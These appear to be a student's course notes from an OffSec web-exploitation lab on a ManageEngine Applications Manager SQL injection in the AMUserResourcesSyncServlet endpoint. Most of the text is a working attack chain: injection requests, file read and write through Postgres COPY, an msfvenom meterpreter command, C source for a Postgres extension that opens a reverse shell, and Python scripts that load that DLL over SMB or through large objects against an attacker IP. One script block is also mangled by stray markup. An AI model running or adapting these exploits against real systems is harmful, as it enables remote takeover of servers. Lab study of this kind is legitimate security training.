Creds:

| URL                        | Username | Password |
| -------------------------- | -------- | -------- |
| https://manageengine:8443/ | admin    | admin    |
# Vulnerability Discovery 
*ManageEngine Applications Manager is an application performance monitoring solution that proactively monitors business applications and help businesses ensure their revenue-critical applications meet end user expectations. Applications Manager offers out of the box monitoring support for 80+ applications and servers.*

* Most URIs end in the `.do` extension: https://fileinfo.com/extension/do
![[3e8bfaa72eb15d3a48dc5291f8e99642-Picture1.png]]
* Try and find what versions being run:
	* Java/ Python version?
	* Host version etc
![[19e8e34e2b068e6d68883a2224c064d5-Picture6 1.png]]
* Search directory for key information
# Source Code Recovery 
* Rule out standard third party libraries like `struts.jar`, `xmlsec-1.3.0.jar`
* Look for interesting files: 
	* `AdventNetAppManagerWebClient.jar`
* Look in JD-Gui
	* Not good for searching, extract and open in an IDE?

* Is there a database being used? SQLi? 
	* Look for query strings
```Java
String query = "select count(*) from Alert where SEVERITY = " + i + " and groupname ='AppManager'";
```
Search for more `query`'s 

### Java HTTP Handlers
* Look for front end implementation and look for HTTP requests
	- _doGet_
	- _doPost_
	- _doPut_
	- _doDelete_
	- _doCopy_
	- _doOptions_
![[aae32ff2fabbc2d1927a397dda10c036-Picture25 1.png]]
* Typically `doPost` and `doGet` require 2 parameters
```Java
protected void doGet(HttpServletRequest req,
                     HttpServletResponse resp)
```

```Java
public class AMUserResourcesSyncServlet
19:   extends HttpServlet
20: {
21:   public void doPost(HttpServletRequest request, HttpServletResponse response)
22:     throws ServletException, IOException
23:   {
24:     doGet(request, response);
25:   }
26:   
27:   public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException
28:   {
29:     response.setContentType("text/html; charset=UTF-8");
30:     PrintWriter out = response.getWriter();
31:     String isSyncConfigtoUserMap = request.getParameter("isSyncConfigtoUserMap");
32:     if ((isSyncConfigtoUserMap != null) && ("true".equals(isSyncConfigtoUserMap)))
33:     {
34:       fetchAllConfigToUserMappingForMAS(out);
35:       return;
36:     }
37:     String masRange = request.getParameter("ForMasRange");
38:     String userId = request.getParameter("userId");
39:     String chkRestrictedRole = request.getParameter("chkRestrictedRole");
40:     AMLog.debug("[AMUserResourcesSyncServlet::(doGet)] masRange : " + masRange + ", userId : " + userId + " , chkRestrictedRole : " + chkRestrictedRole);
41:
42:     if ((chkRestrictedRole != null) && ("true".equals(chkRestrictedRole)))
43:     {
44:       boolean isRestricted = RestrictedUsersViewUtil.isRestrictedRole(userId);
45:       out.println(isRestricted);
46:
47:
48:     }
49:     else if (masRange != null) 
        {
50:       if ((userId != null) && (!"".equals(userId))) {
52:         fetchUserResourcesofMASForUserId(userId, masRange, out);
          } else {
56:         fetchAllUserResourcesForMAS(masRange, out);
57:       }
58:     }
```
* `doPost` simply forwards to `doGet`
* Lines 37-39 Get 3 Parameters
* Looking for these queries in JD-Gui shows that they are use within a `SELECT` function
![[559b6df0ce7b00de5a995bc1a6f217c2-Picture31 1.png]]
```Java
66:   public void fetchUserResourcesofMASForUserId(String userId, String masRange, PrintWriter out)
67:   {
68:     int stRange = Integer.parseInt(masRange);
69:     int endRange = stRange + EnterpriseUtil.RANGE;
70:     String qry = "select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=" + userId + " and RESOURCEID >" + stRange + " and RESOURCEID < " + endRange;
71:     AMLog.debug("[AMUserResourcesSyncServlet::(fetchUserResourcesofMASForUserId)] qry : " + qry);
72:     
73:     ResultSet rs = null;
74:     try
75:     {
76:       rs = AMConnectionPool.executeQueryStmt(qry);
77:       while (rs.next())
78:       {
79:         String resId = rs.getString(1);
80:         out.println(resId);
81:       }
82:     }
83:     catch (Exception ex)
84:     {
85:       ex.printStackTrace();
86:     }
87:     finally
88:     {
89:       AMConnectionPool.closeStatement(rs);
90:     }
91:   }
```
* Line 70 shows the SQL Query and line 76 executes it. Looking for when this function is called: 
```Java
42:     if ((chkRestrictedRole != null) && ("true".equals(chkRestrictedRole)))
43:     {
44:       boolean isRestricted = RestrictedUsersViewUtil.isRestrictedRole(userId);
45:       out.println(isRestricted);
46:
47:
48:     }
49:     else if (masRange != null) 
        {
50:       if ((userId != null) && (!"".equals(userId))) {
52:         fetchUserResourcesofMASForUserId(userId, masRange, out);
          } else {
56:         fetchAllUserResourcesForMAS(masRange, out);
57:       }
58:     }
``````
* Need to enter the `else if` statement. Then we can enter `fetchAllUserResourcesForMAS` and access the query.
# Triggering the Vuln
* We need a URL to trigger the vulnerability. 
* Within the `web.xml` we know the URL uses this:
Mapping:
```Java
<servlet-mapping>
    <servlet-name>AMUserResourcesSyncServlet</servlet-name>
    <url-pattern>/servlet/AMUserResourcesSyncServlet</url-pattern>
</servlet-mapping>
```
Mapping Location:
```Java
<servlet>
    <servlet-name>AMUserResourcesSyncServlet</servlet-name>
    <servlet-class>com.adventnet.appmanager.servlets.comm.AMUserResourcesSyncServlet</servlet-class>
</servlet>
```
* Need 2 paramaters to trigger:
```HTTP
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1; HTTP/1.1
Host: manageengine:8443
```
Add the semi colon as there are no terminators in the query, so we can manually terminate it. 
```SQL
String qry = "select distinct(RESOURCEID) from AM_USERRESOURCESTABLE
where USERID=" + userId + " and RESOURCEID >" + stRange + " and
RESOURCEID < " + endRange;
```
# Convert into a POC
```Python
import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
	if len(sys.argv) != 2:
		print "(+) usage %s <target>" % sys.argv[0]
		print "(+) eg: %s target" % sys.argv[0]
		sys.exit(1)
	
	t = sys.argv[1]
	
	sqli = ";"

	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, 
					  params='ForMasRange=1&userId=1%s' % sqli, verify=False)
	print r.text
	print r.headers

if __name__ == '__main__':
	main()
```
```HTTP
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID_APM_9090=5A0EF105FBA016EA342E8B6F20B8FB63;
Path=/; Secure; HttpOnly
Content-Type: text/html;charset=UTF-8
Content-Length: 0
Date: Sat, 26 Nov 2016 08:57:40 GMT
```
* Content length of 0,  is this good or bad? :( 
`C:\Program Files (x86)\ManageEngine\AppManager12\working\pgsql\data\amdb\pgsql_log`
```Text
[ 2018-04-21 04:33:39.928 GMT ]:LOG:  execute <unnamed>: select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1
[ 2018-04-21 04:33:39.929 GMT ]:ERROR:  syntax error at or near "and" at character 2
[ 2018-04-21 04:33:39.929 GMT ]:STATEMENT:   and RESOURCEID >1 and RESOURCEID < 10000001
```
* Issues with no data in the SQL query can result in the misleading information. 
Change to time based to see.
```HTTP
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;
select+pg_sleep(10); HTTP/1.1
Host: manageengine:8443
```


```CMD
[ 2018-04-21 04:42:58.221 GMT ]:ERROR:  operator does not exist: integer &# integer at character 73
[ 2018-04-21 04:42:58.221 GMT ]:HINT:  No operator matches the given name and argument type(s). You might need to add explicit type casts.
[ 2018-04-21 04:42:58.221 GMT ]:STATEMENT:  select distinct(RESOURCEID) from AM_USERRESOURCESTABLE where USERID=1&#39
```
`1&#39` Can see special char is HTML encoded. 
* In my SQL you can hex encode the characters.
```mysql 
select concat('1337',' h@x0r')
```
```mysql
select concat(0x31333337,0x206840783072)
```
* Not possible in psql.
```psql
select convert_from(decode('QVdBRQ==', 'base64'), 'utf-8');
```
### Using CHR and String Concat
* Use individual characters using their code points and piping together.
```
amdb=#SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
 ?column?
----------
 AWAE
```
* Only works on basic queries such as *SELECT*, *INSERT*, *DELETE* etc. 
```PSQL
amdb=# CREATE TABLE AWAE (offsec text); INSERT INTO AWAE(offsec) VALUES (CHR(65)||CHR(87)||CHR(65)||CHR(69));
CREATE TABLE
INSERT 0 1
amdb=# SELECT * from AWAE;
 offsec
--------
 AWAE
```
 ^Works
```PSQL
CREATE TABLE AWAE (offsec text);
INSERT INTO AWAE(offsec) VALUES (CHR(65)||CHR(87)||CHR(65)||CHR(69));
COPY AWAE (offsec) TO CHR(99)||CHR(58)||CHR(92)||CHR(92)||CHR(65)||CHR(87)||CHR(65)||CHR(69));
ERROR:  syntax error at or near "CHR"
LINE 3: COPY AWAE (offsec) TO CHR(99)||CHR(58)||CHR(92)||CHR(92)||CH...
                              ^

********** Error **********
```
Doesnt work :(
### Lexical 
* PSQL supports Lexical Structure (https://www.postgresql.org/docs/9.2/sql-syntax-lexical.html)
* 2 dollars can be used as a quote.
```PSQL
SELECT 'AWAE';
SELECT $$AWAE$$;
SELECT $TAG$AWAE$TAG$;
```
```PSQL
CREATE TEMP TABLE AWAE(offsec text);INSERT INTO AWAE(offsec) VALUES ($$test$$);
COPY AWAE(offsec) TO $$C:\Program Files (x86)\PostgreSQL\9.2\data\test.txt$$;
```
### POC
```HTTP
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;<some query>;--+ HTTP/1.0
Host: manageengine:8443
```
```PSQL
SELECT current_setting('is_superuser');
```
```HTTP
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
Host: manageengine:8443
```
* Will sleep for 10 seconds *if* the user is a  superuser.
* PSQL command injection
```psql
CREATE temp table awae (content text);
COPY awae from $$c:\awae.txt$$;
SELECT content from awae;
DROP table awae;
```
```HTTP
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;create+temp+table+awae+(content+text);copy+awae+from+$$c:\awae.txt$$;select+case+when(ascii(substr((select+content+from+awae),1,1))=104)+then+pg_sleep(10)+end;--+ HTTP/1.0
Host: manageengine:8443
```
* Reading the first character of the file C:\awae.txt and comparing it with the letter "h". If the letter is "h", sleep for 10 seconds.
```HTTP
GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;COPY+(SELECT+$$offsec$$)+to+$$c:\\offsec.txt$$;--+ HTTP/1.0
Host: manageengine:8443
```
## Reverse Shell
* One of the possible attacks is to overwrite an existing _batch_ file that is used by the ManageEngine application. The idea is that we can insert our malicious commands into a batch file that will get executed by the ManageEngine application.
* A more elegant way would be to introduce malicious code into the VBS files that are used by the ManageEngine application during normal operation.
* `C:\Program\ Files\ (x86)\ManageEngine\AppManager12\working\conf\application\scripts`
* run the Sysinternals Process Monitor[1](https://portal.offsec.com/courses/web-300-687/learning/manageengine-applications-manager-amuserresourcessyncservlet-sql-injection-rce-10582/accessing-the-file-system-10613/reverse-shell-via-copy-to-10797#fn-local_id_103-1) tool with a _VBS_ path filter on our target host, we can see that one of the files that is executed on a regular basis is wmiget.vbs
![[57b2030e430d9e185c47f350b002c5f0-procmon.png]]
* Generate a meterpreter reverse shell payload and insert it at the end of the file
1. We need to make a backup copy of the target file as we will need to restore it once we are done with this attack vector.
2. We have to convert the content of the target file to a one-liner and make sure it is still executing properly before appending our payload. This is because _COPY\ TO_ can't handle newline control characters in a single _SELECT_ statement.
3. Our payload must also be on a single line for the same reason as stated above.
4. We have to encode our payload twice in the GET request. We need to use _base64_ encoding to avoid any issues with restricted characters within the _COPY TO_ function and we also need to _urlencode_ the payload so that nothing gets mangled by the web server itself. Finally, we need to use the _convert_from_ function to convert the output of the decode function to a human-readable format. The general query that we will use for the injection looks like this:
```PSQL
copy (select convert_from(decode($$ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) to $$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
```
```shell
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=4444 -e x86/shikata_ga_nai -f vbs
```
### Alternate Execution Methods - PSQL Extensions

An extension can be loaded in the following way:
```PSQL
CREATE OR REPLACE FUNCTION test(text) RETURNS void AS 'FILENAME', 'test' LANGUAGE 'C' STRICT;
```
* The compiled extension we want to load must define an appropriate Postgres structure (magic block) to ensure that a dynamic library is not loaded into an incompatible server:
```PSQL
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS 'C:\Windows\System32\kernel32.dll', 'WinExec' LANGUAGE C STRICT;
SELECT system('hostname');
ERROR:  incompatible library "c:\Windows\System32\kernel32.dll": missing magic block
HINT: Extension libraries are required to use the PG_MODULE_MAGIC macro.

********** Error **********
```
Sample code for an extension 

```C
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include "utils/builtins.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif
 
/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum awae(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(awae);
 
/* this function launches the executable passed in as the first parameter
in a FOR loop bound by the second parameter that is also passed*/
Datum
awae(PG_FUNCTION_ARGS)
{
 	/* convert text pointer to C string */
#define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

/* retrieve the second argument that is passed to the function (an integer)
that will serve as our counter limit*/
int instances = PG_GETARG_INT32(1);

for (int c = 0; c < instances; c++) {
/*launch the process passed in the first parameter*/
ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);}
PG_RETURN_VOID();
}
```
* The `awae` function will launch an arbitrary process using the windows native `ShellExecute` function in a loop that is bound by the second argument
* This can be built into a dll.
#### Test the extension
* Need to create a UDF called test 
```PSQL
CREATE OR REPLACE FUNCTION test(text) RETURNS void AS 'FILENAME', 'test' LANGUAGE 'C' STRICT;
```
```
```PSQL
create or replace function test(text, integer) returns void as $$C:\awae.dll$$, $$awae$$ language C strict;
SELECT test($$calc.exe$$, 3);
```
If something goes wrong and you wish to unload the extension
```Cmd
net stop "Applications Manager"
del c:\awae.dll
net start "Applications Manager"
```
Drop the function 
```PSQL
DROP FUNCTION test(text, integer);
```
#### Host the extension somewhere else
```Shell
mkdir /home/kali/awae
sudo impacket-smbserver awae /home/kali/awae/
```
* Grab the shell
```PSQL
CREATE OR REPLACE FUNCTION <psql function name>(text, integer) RETURNS void AS $$\\192.168.119.120\<samba share>\<file>$$, $$<function that will be called>$$ LANGUAGE C STRICT;
SELECT <psql function name>($$<ip>$$, <port>);
```
#### Reverse Shell
Example reverse shell - compile this in Visual sudio:
```C
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include <winsock2.h>
#include "utils/builtins.h"
#pragma comment(lib, "ws2_32")

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum connect_back(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(connect_back);

WSADATA wsaData;
SOCKET s1;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO sui;
PROCESS_INFORMATION pi;

Datum
connect_back(PG_FUNCTION_ARGS)
{

	/* convert C string to text pointer */
#define GET_TEXT(cstrp) \
   DatumGetTextP(DirectFunctionCall1(textin, CStringGetDatum(cstrp)))

	/* convert text pointer to C string */
#define GET_STR(textp) \
  DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

	WSAStartup(MAKEWORD(2, 2), &wsaData);
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	hax.sin_family = AF_INET;
	hax.sin_port = htons(PG_GETARG_INT32(1)); 
	hax.sin_addr.s_addr = inet_addr(GET_STR(PG_GETARG_TEXT_P(0)));
	WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s1;

	CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
	PG_RETURN_VOID();
}
```
resources/rev_shell.c
#### Send the Payload
```Python
import requests, sys
requests.packages.urllib3.disable_warnings()

def log(msg):
   print msg

def make_request(url, sql):
   log("[*] Executing query: %s" % sql[0:80])
   r = requests.get( url % sql, verify=False)
   return r

def create_udf_func(url):
   log("[+] Creating function...")
   sql = "--------FIX ME--------"
   make_request(url, sql)

def trigger_udf(url, ip, port):
   log("[+] Launching reverse shell...")
   sql = "select rev_shell($$%s$$, %d)" % (ip, int(port))
   make_request(url, sql)
   
if __name__ == '__main__':
   try:
       server = sys.argv[1].strip()
       attacker = sys.argv[2].strip()
       port = sys.argv[3].strip()
   except IndexError:
       print "[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0]
       sys.exit()
       
   sqli_url  = "https://"+server+"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--" 
   create_udf_func(sqli_url)
   trigger_udf(sqli_url, attacker, port)](<import requests
import sys

requests.packages.urllib3.disable_warnings()

def log(msg):
    print(msg)

def make_request(url, sql):
    log("[*] Executing query: {}".format(sql[:80]))
    r = requests.post(url % sql, verify=False)
    return r

def create_udf_func(url):
    log("[+] Creating function...")
    sql = "CREATE%20OR%20REPLACE%20FUNCTION%20plzwork%28text%2C%20integer%29%20RETURNS%20void%20AS%20%24%24%5C%5C192.168.45.216%5Cawae%5Crev_shell.dll%24%24%2C%20%24%24connect_back%24%24%20LANGUAGE%20C%20STRICT%3BSELECT%20plzwork%28%24%24192.168.45.216%24%24%2C%204444%29%3B"
    make_request(url, sql)

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("[-] Usage: {} serverIP:port attackerIP port".format(sys.argv[0]))
        sys.exit(1)

    server = sys.argv[1].strip()
    attacker = sys.argv[2].strip()
    port = sys.argv[3].strip()

    sqli_url = "https://{}/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;{};--".format(server, "%s")
    create_udf_func(sqli_url)>)
```
```
python3 revshell.py manageengine:8443 192.168.45.216 4444
```
rev_shell_pg_extensions.py

Example working:

```
CREATE OR REPLACE FUNCTION plzwork(text, integer) RETURNS void AS $$\\192.168.45.216\awae\rev_shell.dll$$, $$connect_back$$ LANGUAGE C STRICT;SELECT plzwork($$192.168.45.216$$, 4444);
```

Need a SMB Share to download
![[5e462ec2003ec7b2d69439e0f95700ca-Picture29.png]]
### More Shells

#### PostgreSQL Large Objects
* Large object which is used for storing data such as a PDF document. 
* The files can be copied back to the file system as they were. 

1. Create a large object that will hold our binary payload (our custom DLL file we created in the previous section)
2. Export that large object to the remote server file system
3. Create a UDF that will use the exported DLL as source
4. Trigger the UDF and execute arbitrary code

Select the large object you want to import 
```PSQL
select lo_import('C:\\Windows\\win.ini');
```
```PSQL
\lo_list
```
Importing the `win.ini` file into the database and as a return value we are provided with the `loid` of the large object.
A `loid` is a integral value that we need to reference when exporting large objects.
`lo_import` allows us to set the `loid` to whatever we want
```PSQL
select lo_import('C:\\Windows\\win.ini', 1337);
```
The large objects are stored in the `pg_largeobject` table.
```PSQL
select loid, pageno from pg_largeobject;
```
```
 loid | pageno
------+--------
 1337 |      0
```
* When a large object is created they are imported and split into 2KB chunks which is stored individually in the `pg_largeobject` table:
*The amount of data per page is defined to be LOBLKSIZE (which is currently BLCKSZ/4, or typically 2 kB).*
```
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
```
 loid | pageno |           encode
------+--------+----------------------------
 1337 |      0 | ; for 16-bit app support\r+
      |        | [fonts]\r                 +
      |        | [extensions]\r            +
      |        | [mci extensions]\r        +
      |        | [files]\r                 +
      |        | [Mail]\r                  +
      |        | MAPI=1\r                  +
      |        |
(1 row)
```
* Updating the entry
```PSQL
update pg_largeobject set data=decode('77303074', 'hex') where loid=1337 and pageno=0;
```
```
select loid, pageno, encode(data, 'escape') from pg_largeobject;
 loid | pageno | encode
------+--------+--------
 1337 |      0 | w00t
```
Finally we need to take a look at the `lo_export`, as this function is used to export an arbitrary large object back to the file system using the *loid* as the identifier. 
```PSQL
select lo_export(1337, 'C:\\new_win.ini');
```
![[6eb6b46c5bfff2ab61b0d04375ad0154-Picture30 1.png]]
* To delete from the large object: 
```PSQL
\lo_unlink 1337
```
#### Large Object Reverse Shell
1. Create a DLL file that will contain our malicious code
2. Inject a query that creates a large object from an arbitrary remote file on disk
3. Inject a query that updates page 0 of the newly created large object with the first 2KB of our DLL
4. Inject queries that insert additional pages into the _pg_largeobject_ table to contain the remainder of our DLL
5. Inject a query that exports our large object (DLL) onto the remote server file system
6. Inject a query that creates a PostgreSQL User Defined Function (UDF) based on our exported DLL
7. Inject a query that executes our newly created UDF

Encoding matters here
```Python
import requests, sys, urllib, string, random, time
requests.packages.urllib3.disable_warnings()

# encoded UDF rev_shell dll
udf ='YOUR DLL GOES HERE'
loid = 1337

def log(msg):
   print msg

def make_request(url, sql):
   log("[*] Executing query: %s" % sql[0:80])
   r = requests.get( url % sql, verify=False)
   return r

def delete_lo(url, loid):
   log("[+] Deleting existing LO...")
   sql = "SELECT lo_unlink(%d)" % loid
   make_request(url, sql)

def create_lo(url, loid):
   log("[+] Creating LO for UDF injection...")
   sql = "SELECT lo_import($$C:\\windows\\win.ini$$,%d)" % loid
   make_request(url, sql)
   
def inject_udf(url, loid):
   log("[+] Injecting payload of length %d into LO..." % len(udf))
   for i in range(0,((len(udf)-1)/--------FIX ME--------)+1):
         udf_chunk = udf[i*--------FIX ME--------:(i+1)*--------FIX ME--------]
         if i == 0:
             sql = "UPDATE PG_LARGEOBJECT SET data=decode($$%s$$, $$--------FIX ME--------$$) where loid=%d and pageno=%d" % (udf_chunk, loid, i)
         else:
             sql = "INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES (%d, %d, decode($$%s$$, $$--------FIX ME--------$$))" % (loid, i, udf_chunk)
         make_request(url, sql)

def export_udf(url, loid):
   log("[+] Exporting UDF library to filesystem...")
   sql = "SELECT lo_export(%d, $$C:\\Users\\Public\\rev_shell.dll$$)" % loid
   make_request(url, sql)
   
def create_udf_func(url):
   log("[+] Creating function...")
   sql = "create or replace function rev_shell(text, integer) returns VOID as $$C:\\Users\\Public\\rev_shell.dll$$, $$connect_back$$ language C strict"
   make_request(url, sql)

def trigger_udf(url, ip, port):
   log("[+] Launching reverse shell...")
   sql = "select rev_shell($$%s$$, %d)" % (ip, int(port))
   make_request(url, sql)
   
if __name__ == '__main__':
   try:
       server = sys.argv[1].strip()
       attacker = sys.argv[2].strip()
       port = sys.argv[3].strip()
   except IndexError:
       print "[-] Usage: %s serverIP:port attackerIP port" % sys.argv[0]
       sys.exit()
       
   sqli_url  = "https://"+server+"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--" 
   delete_lo(sqli_url, loid)   
   create_lo(sqli_url, loid)
   inject_udf(sqli_url, loid)
   export_udf(sqli_url, loid)
   create_udf_func(sqli_url)
   trigger_udf(sqli_url, attacker, port)
```